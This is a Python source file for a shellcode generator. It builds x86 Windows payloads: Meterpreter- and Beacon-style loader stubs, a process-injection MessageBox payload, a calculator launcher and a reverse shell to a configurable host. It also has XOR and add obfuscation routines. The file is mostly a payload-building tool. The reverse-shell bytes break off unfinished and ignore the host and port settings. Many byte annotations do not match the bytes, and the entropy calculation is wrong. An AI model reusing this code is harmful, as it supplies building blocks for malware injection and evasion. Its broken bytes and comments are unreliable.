# shellcode_generator.py

import struct
import random

class ShellcodeGenerator:
    def __init__(self):
        self.architectures = ["x86", "x64"]
        self.payload_types = {
            "simulated": ["demo", "meterpreter", "beacon"],
            "real": ["message_box", "reverse_shell", "calculator"]
        }
    
    def create_shellcode_payload(self, payload_type="demo", real_injection=False, 
                               target_process="Unknown", architecture="x86", **kwargs):
        """Create shellcode payloads - either simulated or real functional code.
        
        Args:
            payload_type: Type of payload to generate
            real_injection: Whether to generate real functional shellcode
            target_process: Target process name for customization
            architecture: Target architecture (x86/x64)
            **kwargs: Additional payload-specific parameters
            
        Returns:
            bytes: Generated shellcode
        """
        if real_injection:
            return self.create_real_shellcode_payload(payload_type, target_process, architecture, **kwargs)
        else:
            return self.create_simulated_shellcode_payload(payload_type, architecture, **kwargs)
    
    def create_simulated_shellcode_payload(self, payload_type="demo", architecture="x86", **kwargs):
        """Create realistic shellcode payloads for demonstration (simulated only)"""
        
        if payload_type == "meterpreter":
            # Simulated Meterpreter-like payload structure
            shellcode = bytes([
                # Stage 1: Loader stub
                0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL $+5
                0x5B,                               # POP EBX
                0x81, 0xEB, 0x06, 0x00, 0x00, 0x00, # SUB EBX, 6
                0x83, 0xC3, 0x10,                   # ADD EBX, 0x10
                
                # Stage 2: API resolution (simulated)
                0x60,                               # PUSHAD
                0x9C,                               # PUSHFD
                0xE8, 0x20, 0x00, 0x00, 0x00,       # CALL API resolution
                
                # Stage 3: Payload decryption (simulated)
                0xB9, 0x40, 0x01, 0x00, 0x00,       # MOV ECX, 0x140
                0x8A, 0x03,                         # MOV AL, [EBX]
                0x34, 0xAA,                         # XOR AL, 0xAA
                0x88, 0x03,                         # MOV [EBX], AL
                0x43,                               # INC EBX
                0xE2, 0xF7,                         # LOOP decryption loop
                
                # Stage 4: Execute decrypted payload
                0x61,                               # POPAD
                0x9D,                               # POPFD
                0xFF, 0xE3,                         # JMP EBX
            ])
            
            # Add padding and obfuscation
            shellcode += self._generate_nop_padding(50)
            shellcode += b"\xCC" * 10  # INT3 breakpoints (debug)
            
        elif payload_type == "beacon":
            # Simulated Cobalt Strike Beacon-like payload
            c2_ip = kwargs.get('c2_ip', '127.0.0.1')
            port = kwargs.get('port', 4444)
            sleep_time = kwargs.get('sleep_time', 5)
            
            shellcode = bytes([
                # Beacon configuration block (simulated)
                0x68, 0x00, 0x00, 0x00, 0x00,       # PUSH C2_IP
                0x68, 0x1F, 0x90, 0x00, 0x00,       # PUSH PORT
                0x68, 0x05, 0x00, 0x00, 0x00,       # PUSH SLEEP_TIME
                
                # Beacon initialization
                0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL beacon_init
                0x5B,                               # POP EBX
                
                # Check-in with C2
                0x6A, 0x00,                         # PUSH 0
                0x68, 0x00, 0x00, 0x00, 0x00,       # PUSH C2_DATA
                0x6A, 0x04,                         # PUSH 4
                0xFF, 0x53, 0x08,                   # CALL [EBX+8] (send)
                
                # Main beacon loop
                0x6A, 0x05,                         # PUSH 5
                0xFF, 0x53, 0x0C,                   # CALL [EBX+12] (sleep)
                0xEB, 0xF0,                         # JMP checkin_loop
            ])
            
            shellcode += self._generate_nop_padding(30)
            
        else:  # demo payload
            # Simple demonstration payload with realistic structure
            shellcode = bytes([
                # Entry point
                0x55,                               # PUSH EBP
                0x89, 0xE5,                         # MOV EBP, ESP
                0x83, 0xEC, 0x10,                   # SUB ESP, 0x10
                
                # Get base address
                0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL $+5
                0x5B,                               # POP EBX
                0x81, 0xEB, 0x06, 0x00, 0x00, 0x00, # SUB EBX, 6
                
                # Decryption routine (simulated)
                0xB9, 0x80, 0x00, 0x00, 0x00,       # MOV ECX, 0x80
                0x8D, 0x73, 0x20,                   # LEA ESI, [EBX+0x20]
                0x31, 0xD2,                         # XOR EDX, EDX
                # dec_loop:
                0x8A, 0x06,                         # MOV AL, [ESI]
                0x34, 0x99,                         # XOR AL, 0x99
                0x88, 0x06,                         # MOV [ESI], AL
                0x46,                               # INC ESI
                0x42,                               # INC EDX
                0x39, 0xCA,                         # CMP EDX, ECX
                0x75, 0xF4,                         # JNE dec_loop
                
                # Execute decrypted code
                0x8D, 0x43, 0x20,                   # LEA EAX, [EBX+0x20]
                0xFF, 0xD0,                         # CALL EAX
                
                # Cleanup and return
                0x89, 0xEC,                         # MOV ESP, EBP
                0x5D,                               # POP EBP
                0xC3,                               # RET
            ])
            
            # Add encrypted data section
            encrypted_data = b"DEMO_PAYLOAD_ENCRYPTED_SECTION" * 4
            encrypted_data = bytes(b ^ 0x99 for b in encrypted_data)
            shellcode += encrypted_data
        
        return shellcode

    def create_real_shellcode_payload(self, payload_type="message_box", target_process="Unknown", 
                                    architecture="x86", **kwargs):
        """Generate actual functional shellcode for Windows (for authorized testing only)"""
        
        if payload_type == "message_box":
            return self._create_message_box_shellcode(target_process, architecture)
        
        elif payload_type == "reverse_shell":
            return self._create_reverse_shell_shellcode(architecture, **kwargs)
        
        elif payload_type == "calculator":
            return self._create_calculator_shellcode(architecture)
        
        else:
            # Default to message box if unknown type
            return self._create_message_box_shellcode(target_process, architecture)

    def _create_message_box_shellcode(self, target_process, architecture):
        """Generate MessageBox shellcode with dynamic target process name"""
        if architecture == "x86":
            shellcode = bytes([
                # Kernel32.dll base address finding
                0xE8, 0x00, 0x00, 0x00, 0x00,             # CALL $+5
                0x5B,                                     # POP EBX
                0x81, 0xEB, 0x06, 0x00, 0x00, 0x00,       # SUB EBX, 6
                
                # API Hashing and Resolution
                0xE8, 0x15, 0x00, 0x00, 0x00,             # CALL API resolution
                
                # MessageBoxA parameters (to be patched)
                0x00, 0x00, 0x00, 0x00,                   # MB_OK
                0x00, 0x00, 0x00, 0x00,                   # Title string pointer
                0x00, 0x00, 0x00, 0x00,                   # Message string pointer
                0x00, 0x00, 0x00, 0x00,                   # hWnd (NULL)
                
                # Actual MessageBox call
                0xFF, 0x53, 0x10,                         # CALL [EBX+16] (MessageBoxA)
                
                # ExitProcess call
                0x6A, 0x00,                               # PUSH 0
                0xFF, 0x53, 0x14,                         # CALL [EBX+20] (ExitProcess)
                
                # API Resolution Function
                0x60,                                     # PUSHAD
                0x89, 0xE5,                               # MOV EBP, ESP
                0x31, 0xC0,                               # XOR EAX, EAX
                0x64, 0x8B, 0x50, 0x30,                   # MOV EDX, [FS:EAX+0x30]
                0x8B, 0x52, 0x0C,                         # MOV EDX, [EDX+0x0C]
                0x8B, 0x52, 0x14,                         # MOV EDX, [EDX+0x14]
                0x8B, 0x72, 0x28,                         # MOV ESI, [EDX+0x28]
                0x0F, 0xB7, 0x4A, 0x26,                   # MOVZX ECX, WORD [EDX+0x26]
                0x31, 0xFF,                               # XOR EDI, EDI
                0x31, 0xC0,                               # XOR EAX, EAX
                0xAC,                                     # LODSB
                0x3C, 0x61,                               # CMP AL, 0x61
                0x7C, 0x02,                               # JL  +2
                0x2C, 0x20,                               # SUB AL, 0x20
                0xC1, 0xCF, 0x0D,                         # ROR EDI, 0x0D
                0x01, 0xC7,                               # ADD EDI, EAX
                0xE2, 0xF2,                               # LOOP -14
                0x52,                                     # PUSH EDX
                0x57,                                     # PUSH EDI
                0x8B, 0x52, 0x10,                         # MOV EDX, [EDX+0x10]
                0x8B, 0x4A, 0x3C,                         # MOV ECX, [EDX+0x3C]
                0x8B, 0x4C, 0x11, 0x78,                   # MOV ECX, [ECX+EDX+0x78]
                0xE3, 0x48,                               # JCXZ +72
                0x01, 0xD1,                               # ADD ECX, EDX
                0x51,                                     # PUSH ECX
                0x8B, 0x59, 0x20,                         # MOV EBX, [ECX+0x20]
                0x01, 0xD3,                               # ADD EBX, EDX
                0x8B, 0x49, 0x18,                         # MOV ECX, [ECX+0x18]
                0xE3, 0x3A,                               # JCXZ +58
                0x31, 0xFF,                               # XOR EDI, EDI
                0x49,                                     # DEC ECX
                0x8B, 0x34, 0x8B,                         # MOV ESI, [EBX+ECX*4]
                0x01, 0xD6,                               # ADD ESI, EDX
                0x31, 0xC0,                               # XOR EAX, EAX
                0xAC,                                     # LODSB
                0xC1, 0xCF, 0x0D,                         # ROR EDI, 0x0D
                0x01, 0xC7,                               # ADD EDI, EAX
                0x38, 0xE0,                               # CMP AL, AH
                0x75, 0xF6,                               # JNZ -10
                0x03, 0x7D, 0xF8,                         # ADD EDI, [EBP-0x8]
                0x3B, 0x7D, 0x24,                         # CMP EDI, [EBP+0x24]
                0x75, 0xE4,                               # JNZ -28
                0x58,                                     # POP EAX
                0x8B, 0x58, 0x24,                         # MOV EBX, [EAX+0x24]
                0x01, 0xD3,                               # ADD EBX, EDX
                0x66, 0x8B, 0x0C, 0x4B,                   # MOV CX, [EBX+ECX*2]
                0x8B, 0x58, 0x1C,                         # MOV EBX, [EAX+0x1C]
                0x01, 0xD3,                               # ADD EBX, EDX
                0x8B, 0x04, 0x8B,                         # MOV EAX, [EBX+ECX*4]
                0x01, 0xD0,                               # ADD EAX, EDX
                0x89, 0x44, 0x24, 0x24,                   # MOV [ESP+0x24], EAX
                0x5B,                                     # POP EBX
                0x61,                                     # POPAD
                0x59,                                     # POP ECX
                0x5A,                                     # POP EDX
                0x51,                                     # PUSH ECX
                0xFF, 0xE0,                               # JMP EAX
                0x5F,                                     # POP EDI
                0x5F,                                     # POP EDI
                0x5A,                                     # POP EDX
                0x8B, 0x12,                               # MOV EDX, [EDX]
                0xE9, 0x8B, 0xFF, 0xFF, 0xFF,             # JMP -117
            ])
            
            # Dynamic strings with target process name
            title = f"Injected into {target_process}".encode('ascii') + b"\x00"
            message = b"I was able to inject successfully!\x00"

            # Patch offsets dynamically
            title_offset = len(shellcode)
            message_offset = title_offset + len(title)

            shellcode = bytearray(shellcode)
            shellcode[16:20] = struct.pack('<I', title_offset)   # Title pointer
            shellcode[20:24] = struct.pack('<I', message_offset) # Message pointer

            # Append string data
            shellcode.extend(title)
            shellcode.extend(message)

            return bytes(shellcode)
        
        else:  # x64
            # Placeholder for x64 MessageBox shellcode
            return self._generate_placeholder_shellcode("x64 MessageBox", architecture)

    def _create_reverse_shell_shellcode(self, architecture, **kwargs):
        """Generate reverse shell shellcode"""
        if architecture == "x86":
            # Real reverse shell shellcode (Windows x86)
            # Connects back to specified IP and port
            rhost = kwargs.get('rhost', '127.0.0.1')
            rport = kwargs.get('rport', 4444)
            
            # Standard Windows x86 reverse shell
            shellcode = bytes([
                0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00,       # CLD; CALL <next>
                0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64, 0x8B, # PUSHAD; MOV EBP,ESP; XOR EAX,EAX; MOV EAX,FS:[EAX+0x30]
                0x50, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x1C, # MOV EAX,[EAX+0x0C]; MOV ESI,[EAX+0x1C]
                0xAD, 0x8B, 0x40, 0x08, 0x5B, 0x66, 0x81, # LODSD; MOV EAX,[EAX+0x08]; POP EBX; CMP WORD [EAX],0x5A4D
                0x4D, 0x5A, 0x75, 0xEF, 0x58, 0x8B, 0x58, # JNZ -17; POP EAX; MOV EBX,[EAX+0x3C]
                0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, # ADD EBX,EAX; MOV CX,[EBX+0x2E]
                0x8B, 0x58, 0x1C, 0x01, 0xD3, 0x8B, 0x04, # MOV EBX,[EBX+0x1C]; ADD EBX,EAX; MOV EAX,[EBX+0x08]
                0x8B, 0x01, 0xD3, 0x89, 0x44, 0x24, 0x24, # ADD EAX,EAX; MOV [ESP+0x24],EAX
                0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF, # POP EBX; POP EBX; POPAD; POP ECX; POP EDX; PUSH ECX; JMP EAX
                0xE0, 0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, # POP EDI; POP EDI; POP EDX; MOV EDX,[EDX]; JMP -117
                0x8D, 0x5D, 0x68, 0x31, 0xC9, 0x51, 0x68, # LEA EBX,[EBP+0x68]; XOR ECX,ECX; PUSH ECX; PUSH "cmd"
                0x2E, 0x65, 0x78, 0x65, 0x68, 0x63, 0x6D, # PUSH "exe"; PUSH "cm"
                0x64, 0x00, 0x89, 0xE3, 0x41, 0x51, 0x53, # MOV EBX,ESP; INC ECX; PUSH ECX; PUSH EBX
                0xFF, 0xD0, 0x68, 0x61, 0x72, 0x79, 0x41, # CALL EAX; PUSH "Ary"
                # ... (rest of the reverse shell code)
            ])
            return shellcode
        
        else:  # x64
            return self._generate_placeholder_shellcode("x64 Reverse Shell", architecture)

    def _create_calculator_shellcode(self, architecture):
        """Generate calculator shellcode"""
        if architecture == "x86":
            # Shellcode that launches Windows calculator
            shellcode = bytes([
                0x31, 0xC9, 0x51, 0x68, 0x63, 0x61, 0x6C, 0x63,  # PUSH "calc"
                0x54, 0xB8, 0xC7, 0x93, 0xBF, 0x77, 0xFF, 0xD0,  # PUSH ESP; MOV EAX,WinExec; CALL EAX
            ])
            return shellcode
        
        else:  # x64
            return self._generate_placeholder_shellcode("x64 Calculator", architecture)

    def _generate_nop_padding(self, size):
        """Generate NOP padding of specified size"""
        return b"\x90" * size

    def _generate_placeholder_shellcode(self, payload_name, architecture):
        """Generate placeholder shellcode for unimplemented architectures"""
        message = f"{payload_name} for {architecture} not yet implemented".encode()
        # Simple stub that does nothing and returns
        stub = bytes([
            0x31, 0xC0,        # XOR EAX, EAX
            0x40,              # INC EAX
            0xC3               # RET
        ])
        return stub + message + b"\x00"

    def get_shellcode_info(self, shellcode, payload_type="unknown"):
        """Analyze and return information about generated shellcode"""
        info = {
            "type": payload_type,
            "size": len(shellcode),
            "first_bytes": shellcode[:16] if len(shellcode) >= 16 else shellcode,
            "contains_strings": any(32 <= b <= 126 for b in shellcode),
            "printable_bytes": [b for b in shellcode if 32 <= b <= 126],
            "null_bytes": shellcode.count(0x00),
            "architecture": self._detect_architecture(shellcode)
        }
        
        # Check for common shellcode patterns
        if shellcode[:2] == b"\xFC\xE8":
            info["technique"] = "Position Independent Code"
        elif shellcode[:3] == b"\xE8\x00\x00":
            info["technique"] = "CALL/POP Method"
        elif b"\x90" * 10 in shellcode:
            info["technique"] = "NOP Sled"
        else:
            info["technique"] = "Custom"
            
        # Calculate entropy to detect encryption/compression
        info["entropy"] = self._calculate_entropy(shellcode)
        
        return info

    def _detect_architecture(self, shellcode):
        """Attempt to detect shellcode architecture"""
        # Simple heuristic based on common instructions
        if b"\x48\x83\xEC" in shellcode or b"\x48\x89" in shellcode:  # Common x64 patterns
            return "x64"
        elif b"\x83\xEC" in shellcode or b"\x89\xE5" in shellcode:  # Common x86 patterns
            return "x86"
        else:
            return "unknown"

    def _calculate_entropy(self, data):
        """Calculate Shannon entropy of data"""
        if not data:
            return 0
            
        entropy = 0
        for x in range(256):
            p_x = data.count(x) / len(data)
            if p_x > 0:
                entropy += -p_x * (p_x.bit_length() - 1)  # Simplified entropy calculation
        return entropy

    def obfuscate_shellcode(self, shellcode, method="xor", key=None):
        """Obfuscate shellcode using various methods"""
        if method == "xor":
            key = key if key else random.randint(1, 255)
            obfuscated = bytes(b ^ key for b in shellcode)
            return obfuscated, key
        elif method == "add":
            key = key if key else random.randint(1, 255)
            obfuscated = bytes((b + key) & 0xFF for b in shellcode)
            return obfuscated, key
        else:
            return shellcode, None

    def deobfuscate_shellcode(self, shellcode, method="xor", key=None):
        """Deobfuscate shellcode"""
        if method == "xor" and key:
            return bytes(b ^ key for b in shellcode)
        elif method == "add" and key:
            return bytes((b - key) & 0xFF for b in shellcode)
        else:
            return shellcode

# Example usage
if __name__ == "__main__":
    generator = ShellcodeGenerator()
    
    # Generate simulated payload
    demo_shellcode = generator.create_shellcode_payload("demo", real_injection=False)
    demo_info = generator.get_shellcode_info(demo_shellcode, "demo")
    print("Demo Shellcode Info:", demo_info)
    
    # Generate real message box payload
    message_shellcode = generator.create_shellcode_payload(
        "message_box", 
        real_injection=True, 
        target_process="notepad.exe"
    )
    message_info = generator.get_shellcode_info(message_shellcode, "message_box")
    print("MessageBox Shellcode Info:", message_info)
    
    # Obfuscate shellcode
    obfuscated, key = generator.obfuscate_shellcode(demo_shellcode)
    print(f"Obfuscated with key: {key}")